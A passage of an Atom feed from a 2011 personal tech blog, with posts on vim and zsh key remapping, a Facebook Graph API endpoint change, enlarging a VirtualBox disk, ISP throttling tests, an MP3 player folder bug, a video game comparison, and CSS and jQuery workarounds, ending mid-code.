&lt;h2&gt;Toggling normal/insert mode in vim&lt;/h2&gt;

&lt;p&gt;vim accepts two kinds of mapping. Those triggered in normal mode (using
&lt;code&gt;nnoremap&lt;/code&gt;) and those triggered in insert mode (using &lt;code&gt;inoremap&lt;/code&gt;).&lt;/p&gt;

&lt;p&gt;Here we want that pressing CapsLock (or &lt;code&gt;&amp;lt;F13&amp;gt;&lt;/code&gt; in vim as we defined) in
normal mode will go to insert mode, like pressing &lt;code&gt;i&lt;/code&gt; does. And we also want
to get back to normal mode when pressing CapsLock in insert mode, just like
pressing &lt;code&gt;Esc&lt;/code&gt; does.&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-vim&quot; data-lang=&quot;vim&quot;&gt;&lt;span class=&quot;nb&quot;&gt;nnoremap&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;F13&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;i&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;inoremap&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;F13&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;Esc&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;l&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Notice the &lt;code&gt;l&lt;/code&gt; after Esc. It is here to prevent the caret to move back one
character when exiting insert mode.&lt;/p&gt;

&lt;h2&gt;Fixing the shell&lt;/h2&gt;

&lt;p&gt;One last thing to fix is your shell. By defining in xmodmap that pressing
CapsLock would trigger an F13 event, it means that whatever software that
react on F13 will now react on CapsLock. Unfortunatly, zsh does react on F13.
It insert a &lt;code&gt;~&lt;/code&gt; character on it (just like it does with F12).&lt;/p&gt;

&lt;p&gt;To disable it, we&amp;#39;ll simply define a key binding in &lt;code&gt;~/.zshrc&lt;/code&gt; so pressing F13
does nothing.&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;bindkey -s &lt;span class=&quot;s2&quot;&gt;&amp;quot;\e[25~&amp;quot;&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;&amp;quot;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Here it is. You can now press CapsLock anywhere and it won&amp;#39;t have any effect.
Plus, pressing it in vim will toggle insert/normal mode.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>Getting the list of Facebook pending requests of a user</title>
   <link href="http://blog.pixelastic.com/2011/10/07/list-facebook-pending-requests-user/"/>
   <updated>2011-10-07T00:00:00+02:00</updated>
   <id>http://blog.pixelastic.com/2011/10/07/list-facebook-pending-requests-user</id>
   <content type="html">&lt;p&gt;Getting the list of pending facebook requests of a user a few weeks back was
as easy as calling &lt;code&gt;https://graph.facebook.com/me/apprequests?access_token={user_access_token}&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;We discovered around the 1st October that some of our requests were failing in
production, without any more clue than some &amp;quot;OAuthException : access_token
invalid&amp;quot; messages in our logs.&lt;/p&gt;

&lt;p&gt;It appears that FB changed the way their endpoint react to &lt;code&gt;/apprequests&lt;/code&gt;
call. Of course, they didn&amp;#39;t bother telling us.&lt;/p&gt;

&lt;p&gt;The previous url does not work anymore. Switching the user access&lt;em&gt;token to the
app access&lt;/em&gt;token as documented does not work (as usual with FB documentation).
It returns an error.&lt;/p&gt;

&lt;p&gt;Instead, the following call wil yield the correct result : &lt;code&gt;https://graph.facebook.com/{user_id}/apprequests?access_token={app_access_token}&lt;/code&gt;&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>Increasing VirtualBox hard drive size</title>
   <link href="http://blog.pixelastic.com/2011/10/04/increasing-virtualbox-hard-drive-size/"/>
   <updated>2011-10-04T00:00:00+02:00</updated>
   <id>http://blog.pixelastic.com/2011/10/04/increasing-virtualbox-hard-drive-size</id>
   <content type="html">&lt;p&gt;While trying to import a huge (1.7Go) mysql dump file into my VM I was blocked
by mysql telling me that not enough space was left on the device to complete
the operation.&lt;/p&gt;

&lt;p&gt;As I was running a VM, I thought it would be a simple matter of increasing the
virtual hard drive size.&lt;/p&gt;

&lt;p&gt;Turns out it wasn&amp;#39;t that simple. After much trial and error, here is how I
finally did it.&lt;/p&gt;

&lt;h2&gt;Creating a new hard drive&lt;/h2&gt;

&lt;p&gt;VirtualBox let you easily add new devices, such as hard drives to your VM. I
simply created an empty 120Go hard drive and booted my VM.&lt;/p&gt;

&lt;p&gt;Here, under Ubuntu, I cloned my current hard drive to the new one using :&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;sudo dd &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/dev/sda &lt;span class=&quot;nv&quot;&gt;of&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/dev/sdb
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h2&gt;Fixing the guest partition&lt;/h2&gt;

&lt;p&gt;Once finished, I opened Gparted, selected &lt;code&gt;/dev/sdb&lt;/code&gt; and saw that I had 112Go
unallocated. I couldn&amp;#39;t easily add them to the initial partition as a swap
partition was in the way.&lt;/p&gt;

&lt;p&gt;I finally decided to remove the swap partition and resize the initial one to
the (almost) complete size of the hard drive.&lt;/p&gt;

&lt;p&gt;I left 1Go free in case I ever needed to create a new swap partition later to
fix the one I deleted.&lt;/p&gt;

&lt;p&gt;Then, I closed the VM. Get back to VirtualBox panel and remove the original
drive, keeping only the new 120Go one.&lt;/p&gt;

&lt;p&gt;One reboot later, my Ubuntu was proudly displaying its 120Go.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>Checking potential throttling from Orange</title>
   <link href="http://blog.pixelastic.com/2011/10/03/checking-potential-throttling-orange/"/>
   <updated>2011-10-03T00:00:00+02:00</updated>
   <id>http://blog.pixelastic.com/2011/10/03/checking-potential-throttling-orange</id>
   <content type="html">&lt;p&gt;Starting a few weeks back, we started having painfully slow ssh connections at
work. Our servers are hosted on the &lt;a href=&quot;http://www.softlayer.com/&quot;&gt;SoftLayer
&lt;/a&gt;infrastructure, which are extended on all North
American territory, but we are based in France.&lt;/p&gt;

&lt;p&gt;We have fiber-optic connection here, almost every other connection is
blazingly fast. Except connections to our own servers...&lt;/p&gt;

&lt;p&gt;Call me paranoid, but the first idea we got was that we were being throttled
by our provider. Orange is infamously known for degrading on purpose
connection with some know hosts.&lt;/p&gt;

&lt;p&gt;A colleague was browsing through his own secure tunnel, going through his
personnal server for every outgoing communication.&lt;/p&gt;

&lt;p&gt;And his connection was as fast as it should be.&lt;/p&gt;

&lt;p&gt;That made us wonder. How a tunneled connection could be faster than a normal
one ? The cost of crypting data should have slow the request down. It had the
opposite effect, rendering the request in the expected time.&lt;/p&gt;

&lt;p&gt;I created a garbage file using the following code and used &lt;code&gt;scp&lt;/code&gt; to send it
from one server to another, to test bandwith.&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;dd &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/dev/zero &lt;span class=&quot;nv&quot;&gt;of&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;garbage.bin &lt;span class=&quot;nv&quot;&gt;bs&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;100000000 &lt;span class=&quot;nv&quot;&gt;count&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Nothing interesting came out of it. I had a impressivly fast connection
between our fiber connection and OVH (up to 50Mb/s) and slow connection to
SoftLayer.&lt;/p&gt;

&lt;p&gt;So, for the time being, I&amp;#39;m connecting to SoftLayer through OVH and even if it
made me use one more tunnel, it is still far more fast than a direct
connection.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>Sansa Clip+ folder merging issue</title>
   <link href="http://blog.pixelastic.com/2011/09/22/sansa-clip-folder-merging-issue/"/>
   <updated>2011-09-22T00:00:00+02:00</updated>
   <id>http://blog.pixelastic.com/2011/09/22/sansa-clip-folder-merging-issue</id>
   <content type="html">&lt;p&gt;I own a &lt;a href=&quot;http://anythingbutipod.com/2009/08/sandisk-sansa-clip-%0Aplus-review/&quot;&gt;Sansa Clip+&lt;/a&gt; as my mp3 player. It&amp;#39;s really small, has great audio quality and
combined with a 32Go microSD card plus the internal 8Go, it&amp;#39;s enough to hold
almost all my music library.&lt;/p&gt;

&lt;p&gt;As with any mp3 player realeased nowadays, you can browse your files using mp3
tags. I don&amp;#39;t really like it and feel limited in my browsing. As I&amp;#39;m listening
to a lot of movie soundtracks I have a pretty long list of artists with only
one song attached.&lt;/p&gt;

&lt;p&gt;Fortunatly, the Sansa also allows you to browse by folders, which is rare
enough to be highlighted.&lt;/p&gt;

&lt;p&gt;So far so good. Except that I&amp;#39;ve discovered a little bug a few days ago in the
way folder navigation is done.&lt;/p&gt;

&lt;p&gt;I had two folders named &lt;code&gt;Soundtrack - Games&lt;/code&gt; and &lt;code&gt;Soundtrack - Movies&lt;/code&gt;. Each
were holding a dozen albums. In each of those folders I had subfolders sharing
the same prefix, like &lt;code&gt;Hitman Contracts&lt;/code&gt;, &lt;code&gt;Hitman Blood Money&lt;/code&gt; or &lt;code&gt;Kill Bill&lt;/code&gt;
and &lt;code&gt;Kill Bill volume 2&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;When browsing my music folder on the Sansa I noticed that the &lt;code&gt;Soundtrack -
Games&lt;/code&gt; folder had disappeared. I check the SD card in my computer, and it
really was there.&lt;/p&gt;

&lt;p&gt;I finally discovered that all the &lt;code&gt;Sountracks - Games&lt;/code&gt; content had been merged
in &lt;code&gt;Soundtracks - Movies&lt;/code&gt; resulting in one big directory instead of two
smaller ones.&lt;/p&gt;

&lt;p&gt;My second discovery was that all my &lt;code&gt;Hitman&lt;/code&gt; sub folders were also merged into
&lt;code&gt;Hitman Contracts&lt;/code&gt;, and my &lt;code&gt;Kill Bill&lt;/code&gt; music was in &lt;code&gt;Kill Bill volume 2&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;It seems that when multiple directories shared the same prefix, all folders
will be merged in one whose name is the last in alphabetical order.&lt;/p&gt;

&lt;p&gt;I&amp;#39;m not the only one in this case, I saw a similar report on Sandisk forums,
but the bug seems erratic. Folders does not always get merged if sharing a
prefix.&lt;/p&gt;

&lt;p&gt;As a temporary fix, waiting for a regular fix in a firmware update, I&amp;#39;ll
update my folder tree to use &lt;code&gt;Soundtracks/Games/Hitman/Contracts&lt;/code&gt; and
&lt;code&gt;Soundtracks/Movies/Kill Bill/Volume 1&lt;/code&gt; but this is far from optimal.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>Red Dead Redemption Vs Tales of Phantasia</title>
   <link href="http://blog.pixelastic.com/2011/09/17/red-dead-redemption-tales-phantasia/"/>
   <updated>2011-09-17T00:00:00+02:00</updated>
   <id>http://blog.pixelastic.com/2011/09/17/red-dead-redemption-tales-phantasia</id>
   <content type="html">&lt;p&gt;&lt;em&gt;Disclaimer : I usually post about technical web stuff, but this time I&amp;#39;ll
digress and share my thoughts about two games I&amp;#39;m currently playing. Feel free
to skip reading this text if you&amp;#39;re not interested in my inner gamer voice.&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;I started Red Dead Redemption on my PS3 a few weeks ago. I also play Tales of
Phantasia on my Dingoo on my way to work and back home everyday.&lt;/p&gt;

&lt;p&gt;Those two games are very different, almost completly different, but in a way,
I can&amp;#39;t stop comparing one to the other.&lt;/p&gt;

&lt;h2&gt;Overview&lt;/h2&gt;

&lt;p&gt;Red Dead Redemption is a &amp;quot;next generation&amp;quot; game, with great graphics, motion
capture, voices, and so on. It is a free roaming game, a GTA like, made by
Rockstar game. Instead of sandboxing in a big city with your car, you&amp;#39;re
sandboxing in the far west with your horse.&lt;/p&gt;

&lt;p&gt;Tales of Phantasia is one the latest JRPG released on the SNES. It is in the
direct vein of gems like FF6 or Secret of Mana. Big story involving saving the
world, defeating bosses, gaining experience, learning new technics and magic,
etc.&lt;/p&gt;

&lt;h2&gt;Storyline&lt;/h2&gt;

&lt;p&gt;Being a free roaming game, RDR does not have a fixed storyline. You can do
quests in different order, depending of the people you run into. Of course,
some parts of the main storyline only unlock themselves when a set of missions
are finished. There is also a lot of sidequests, given by NPC randomly
popping. It gives a general impression of freedom and self-living world. You
can easily play for one hour, doing one or two missions.&lt;/p&gt;

&lt;p&gt;The main character, John Marston, is not very talkative, so you don&amp;#39;t know
much about him. I haven&amp;#39;t finished the game yet but I expect its story to be
revealed the more and more I play. As a side effect, I don&amp;#39;t really feel close
to John, it only is my avatar in the game, and I help him. I feel more like
watching a movie than playing a game.&lt;/p&gt;

&lt;p&gt;Tales of Phantasia is way more classic. You are the son of one of the four
warriors that saved the world decades ago. The evil magician Dhaos that your
parents defeated is now back on course and its your duty to fight him and
defeat him once again. You start as a simple boy, win experience and battles,
meet people and learn more about what your parents did.&lt;/p&gt;

&lt;p&gt;There is a certain amount of freedom in the way you can explore the world map
and go to places where the scenario didn&amp;#39;t yet ask you to go. Nothing to
compare to RDR of course, but in a game of this time, you appreciate it. There
are no invisible walls telling you &amp;quot;You can&amp;#39;t go there&amp;quot;, only signs suggesting
that &amp;quot;This area is for the more experienced&amp;quot;.&lt;/p&gt;

&lt;p&gt;I only have played a couple hours so far, but I like the way the story is
told. People that have known your parents told you what they did, who they
were, where they&amp;#39;ve been, etc. The story is still following the rails of the
scripted scenario but does so in an elegant way.&lt;/p&gt;

&lt;p&gt;&lt;em&gt;Note : The previous JRPG I played, Final Fantasy, was waaaaay more strict on
its storyline order, so my appreciation of Tales of Phantasia might be biased
due to the comparison.&lt;/em&gt;&lt;/p&gt;

&lt;h2&gt;Graphics&lt;/h2&gt;

&lt;p&gt;RDR takes advantage of the PS3 power. All characters are animated using motion
capture and voiced dialogs, making the world seem real. Animation are still a
bit sluggish at time, and always done directly in the game engine. It keeps
consistency, but the engine seems a bit dated.&lt;/p&gt;

&lt;p&gt;I usually am a PC player, I&amp;#39;ve played Bioshock and Crisis when they came out
in maximum quality, so I&amp;#39;m not easily impressed by graphics rendering. The
only game on the PS3 that impressed my was Uncharted 2 and RDR is absolutly
not up to that standard. RDR is like most of the games I&amp;#39;ve played on PS3. It
has &amp;quot;honest&amp;quot; graphics : not ugly, but nothing breathtaking either.&lt;/p&gt;

&lt;p&gt;LOD handling is pretty bad in my opinion. When riding your horse in the
desert, grass and bushes flashes in view from simple LOD to fully detailed in
a split second. It defeat the whole purpose of LOD in my opinion, which should
be done using a smooth transition between the two.&lt;/p&gt;

&lt;p&gt;Also, during cutscenes, when the camera change angle (moving from a close shot
to John, to a shot to the person he&amp;#39;s talking to for example), the LOD kept
flashing. Everytime the camera change, you see the building in the background
displayed as big blocks of colors then fully detailed, and on the next camera
change you got them again from big block to details, even if they are the same
building in the two shots. All that goes very fast, but I kept noticing it.
Worse, sometimes buildings are exactly on the limit between rough and detailed
so they kept flashing from one to another.&lt;/p&gt;

&lt;p&gt;Overall, I&amp;#39;m not satisfied with RDR graphics. They definitly are not ugly but
are just above average and this is not RDR strong point.&lt;/p&gt;

&lt;p&gt;One can wonder how I can even compare a full 3D game with an old 16bit RPG. I
am not comparing the two, I&amp;#39;m comparing each one to what the standard are for
the machine they are running.&lt;/p&gt;

&lt;p&gt;Tales of Phantasia is the more detailed RPG I&amp;#39;ve ever played on a 16bit
console. The attention to detail is amazing. Each house, each city is fully
detailed. There are fires burning in the chimneys, flowers on the tables,
painting and cracks on the walls, carpets on the floor, etc. No two houses are
the same, and the furnitures placed in each are done so in a logical way : the
exact number of beds for the people living in a house, no house without
kitchen, etc.&lt;/p&gt;

&lt;p&gt;For a 16bit game, I must say I&amp;#39;m impressed. There are details everywhere, from
hanging ropes in boats to patch of flowers and rocks on roads, it is really
refreshing. When visiting a boat, the screen moves to emulate the rolling of
the waves. This is no big deal but this is kind of details I appreciate.&lt;/p&gt;

&lt;h2&gt;Shopping UI&lt;/h2&gt;

&lt;p&gt;One thing that strike me as odd is how hard it is to sell goods in RDR. When
speaking to a merchant, you can select goods you wish to sell and press X to
sell them. If you have multiple goods of the same kind, you can select a few
or all at once. The strange thing is that you can&amp;#39;t select different goods at
once, you have to do it one by one (and you usually have a lot of different
goods coming from skinning various animals).&lt;/p&gt;

&lt;p&gt;Worst, goods you sell do not disappear from the list, they are just marked as
&amp;quot;Sold&amp;quot;, you have to manually select the next in the list to proceed. And as
the list is more like a grid, you can&amp;#39;t simply press down to sell the next
item, you have to select it in the list. To make it even a little more
frustrating to use, everytime you sell an item, a little animation is played,
freezing your UI for a second.&lt;/p&gt;

&lt;p&gt;Such an UI would never have passed quality insurance tests if the game had
been developped for a PC audience. I do not understand why crappy UI is
considered normal for console players.&lt;/p&gt;

&lt;p&gt;The shopping UI of Tales of Phantasia has nothing awesome but is just well
thought. Presented with a list of goods to buy you can select the desired
quantity of each, see the total amount and make adjustement regarding your
current cash level. You also see the current number of each item you already
own. As I said, nothing extraordinary, just really well thought and very
practical.&lt;/p&gt;

&lt;p&gt;Screen resolution and hardware power has absolutly no influence on the
greatness of UI here.&lt;/p&gt;

&lt;h2&gt;Music&lt;/h2&gt;

&lt;p&gt;RDR music is honest, there isn&amp;#39;t any theme that get stuck in your mind after
playing, but the various ambiances are pleasant and strike our common
imaginary background of the far west.&lt;/p&gt;

&lt;p&gt;Tales of Phantasia music is also classical JRPG music, with some great songs,
but the important point here is that they managed to make wonder with the
small audio capabilities of the original console. Some music at some important
points in the story have digitalized voices. Yeah, really. This is not crystal
clear voices as a CD would allow today, but it is clear enough so you can
recognize the melody and words (well, if you understand Japanese...).&lt;/p&gt;

&lt;p&gt;Also, even if each city has its own theme, you sometimes encounter NPC in
those cities with their own themes, and the two musics blends into one other
when you approach the NPC. It is something common in today games, but the
first time I see it in a 16bit game.&lt;/p&gt;

&lt;h2&gt;Frustration&lt;/h2&gt;

&lt;p&gt;I have been very frustrated playing RDR. A lot of little things that add up
and degrade my playing experience. Here are some random rambling :&lt;/p&gt;

&lt;p&gt;I&amp;#39;ve failed a large number of missions because I strampled over pedestrian
while galloping with my horse. In one mission, I was asked to save three
horses from a barn on fire. I saved the first two by slapping them on the back
so they can go out of the barn. For the last one, I had ride it and jump over
the fire to get out. I did just that and jumped out of the barn and got a
&amp;quot;Mission failed&amp;quot; screen. Wait, what ?&lt;/p&gt;

&lt;p&gt;It appeared that I assaulted one of the farmers that was trying to help. This
dumbass was standing right in the spot where the mission asked me to jump, so
when jumping over the fire I ran into him and the game considered it an
assault, failed the mission and made me try it again.&lt;/p&gt;

&lt;p&gt;This isn&amp;#39;t the only grudge I have with horse. There are a couple of weird
stuff occuring with the way horses are handled in the game. During a mission,
one of the NPC rode my horse instead of his own, so when I whistle my horse
back, another one came instead. As fast as my horse, but with a totally
different color.&lt;/p&gt;

&lt;p&gt;I once whistle for my horse that came galopping to me, running right past me
and went splashing in the river, dying instantly...&lt;/p&gt;

&lt;p&gt;Speaking of rivers, this is something really frustrating. Your character can&amp;#39;t
swim, actually as soon as he got water above the waist, he drowns. Even on
horseback : water rise to your horse collar and your waist, and you drown.
That is both stupid and frustrating, dying for something that you absolutly
can&amp;#39;t imagine the first time it occurs to you.&lt;/p&gt;

&lt;h2&gt;Funny story&lt;/h2&gt;

&lt;p&gt;On an other occasion, I saw two guys shooting a third one trying to escape. I
thought they were bandits trying to kill an innocent traveller, so I shot
them. Bad choice, they were deputies trying to kill a bandit... I lost some
honor in the process and the bandit turn back on me, trying to kill me after I
saved him.&lt;/p&gt;

&lt;p&gt;A few hours later, same scenario. Two guys trying to kill a lone one. Based on
my previous experience I decided to kill the escaping bandit. I lost honor
too. It appeared it really were two bandits trying to kill a traveller this
time... Of course the two bandits didn&amp;#39;t thank me and started shooting me. So
I had to kill them too.&lt;/p&gt;

&lt;p&gt;Third time, same scenario, two guys shooting a third fleeing one. This time I
decided to wait a little and hear what they had to say, to better understand
who they were and take side with the good guys this time. I didn&amp;#39;t have time
to think too much, because a few seconds later the third guy was dead, killed
by the other two. And I lost honor too. Grrrr. They were bandits and I let
them kill him an innocent man.&lt;/p&gt;

&lt;p&gt;Last but not least I encountered those three guys one last time. This time I
saw that it was two deputies, asking me to help them capture the escaping
bandit. Ok, this time it was clear. I decided to catch the bandit with my
lasso (getting bounties alive gets you paid double). I catched him, but while
I was tying him up, the deputies started shooting me. Actually, they were
shooting the bandit but I was standing between him and them so I took a couple
bullets. Once tied up and lying on the ground, the deputies continued shooting
him until he died... Goodbye reward...&lt;/p&gt;

&lt;p&gt;And this is only one in the multiple stories I could tell about those random
encounters plaggued with less-than-average AI. It resulted in a lot of
frustration and some wtf moments.&lt;/p&gt;

&lt;h2&gt;Conclusion&lt;/h2&gt;

&lt;p&gt;First of all, thank you to have read this pamphlet from start to end, as it
mostly was random rambling that I needed to get out. As a last word I might
say that I&amp;#39;m impressed by the way Tales of Phantasia managed to push the
boundaries of the hardware, and managed to immerse you in its atmosphere
through multiple little details both in controls, music, graphics and story&lt;/p&gt;

&lt;p&gt;On the other hand, Red Dead Redemption is a game just above average. My
general gaming feeling was spoiled by a all those little overlooked details
and glitches that in the end kept frustrating me.&lt;/p&gt;

&lt;p&gt;In the end, both games are interesting in term of Game Design because you can
learn a lot from them. From Red Dead Redemption I&amp;#39;ve learned a lot of small
details that must not be overlooked in term of UI and gaming experience to not
frustrate the player. From Tales of Phantasia I&amp;#39;ve learned that all those
little details that you take care of add up and your players will thank you
for it.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>Show and hide Flash elements without redraw</title>
   <link href="http://blog.pixelastic.com/2011/09/16/show-hide-flash-elements-redraw/"/>
   <updated>2011-09-16T00:00:00+02:00</updated>
   <id>http://blog.pixelastic.com/2011/09/16/show-hide-flash-elements-redraw</id>
   <content type="html">&lt;p&gt;Imagine you have a Flash element in your HTML markup. If you apply any
&lt;code&gt;show&lt;/code&gt;/&lt;code&gt;hide&lt;/code&gt;logic to it, the flash will be reset and played back to its
first frame.&lt;/p&gt;

&lt;p&gt;Actually, as soon as you change the &lt;code&gt;display&lt;/code&gt;property of an element, if
forces all inner Flash element to be restarted.&lt;/p&gt;

&lt;p&gt;There are a few ways you can work around that, and here are the two main I&amp;#39;m
using&lt;/p&gt;

&lt;h2&gt;Your Flash file is in a tab&lt;/h2&gt;

&lt;p&gt;Fairly common scenario, you have tabs on your page (maybe using jQuery UI or a
custom code). When you display your Flash tab, all others are hidden, and when
you display another tab, the Flash one is hidden.&lt;/p&gt;

&lt;p&gt;Instead of using &lt;code&gt;display:none&lt;/code&gt; / &lt;code&gt;display:block&lt;/code&gt;, we&amp;#39;ll be a little more
sneaky and not really &amp;quot;hide&amp;quot; the element, but simply put it out of the user
view.&lt;/p&gt;

&lt;p&gt;Just apply the following CSS rule to the element you want to hide. It will
just display it offscreen.&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-css&quot; data-lang=&quot;css&quot;&gt;&lt;span class=&quot;nc&quot;&gt;.tabHidden&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;position&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;absolute&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;top&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;0px&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;left&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:-&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;9999em&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Don&amp;#39;t forget to add a &lt;code&gt;position:relative&lt;/code&gt; to the HTML parent of your tab for
the absolute positionning to work.&lt;/p&gt;

&lt;h2&gt;You have multiple Flash files in a list&lt;/h2&gt;

&lt;p&gt;This one is trickier. Imagine you have a list of elements, and each row
contains a Flash file. You want to filter the list based on various criterias
and only show the rows matching.&lt;/p&gt;

&lt;p&gt;You can&amp;#39;t use the previous technique here because some elements of your list
will be in relative positionning while others will be in absolute
positionning. And everytime you change the &lt;code&gt;position&lt;/code&gt;property of your
element, the Flash will be reset.&lt;/p&gt;

&lt;p&gt;The trick here is to play with your element dimensions and visibility. You can
change the &lt;code&gt;visibility&lt;/code&gt;without triggering a redraw. As this will only make
the element invisible but still taking space, you just have to put its &lt;code&gt;height
&lt;/code&gt;and &lt;code&gt;width&lt;/code&gt;to &lt;code&gt;0&lt;/code&gt; to make it effectively disappear.&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-css&quot; data-lang=&quot;css&quot;&gt;&lt;span class=&quot;nc&quot;&gt;.listElementHidden&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;visibility&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;hidden&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;width&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;0px&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;height&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;0px&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;margin&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;0px&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;The &lt;code&gt;margin:0px&lt;/code&gt; is here to clear any margin you might have defined around
your element.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>Selecting checked radio button with jQuery and IE8</title>
   <link href="http://blog.pixelastic.com/2011/09/07/selecting-checked-radio-button-jquery-ie8/"/>
   <updated>2011-09-07T00:00:00+02:00</updated>
   <id>http://blog.pixelastic.com/2011/09/07/selecting-checked-radio-button-jquery-ie8</id>
   <content type="html">&lt;p&gt;Ever tried to select the checked &lt;code&gt;radio&lt;/code&gt;button of a form using jQuery ? Well
I did, and hundreds of time before, and never ran into any issues.&lt;/p&gt;

&lt;p&gt;Today&amp;#39;s the first time, and it involves my dear friend IE8. Seems like either
jQuery or IE8 had trouble with my &lt;code&gt;radio&lt;/code&gt; button selection.&lt;/p&gt;

&lt;p&gt;I finally managed to get what I wanted but with a sightly different syntax for
IE8.&lt;/p&gt;

&lt;h2&gt;First, the markup&lt;/h2&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;form&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;id=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;myForm&amp;quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;data[Payment][value]&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;id=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;payment_1500&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;radio&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;value=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;1500&amp;quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
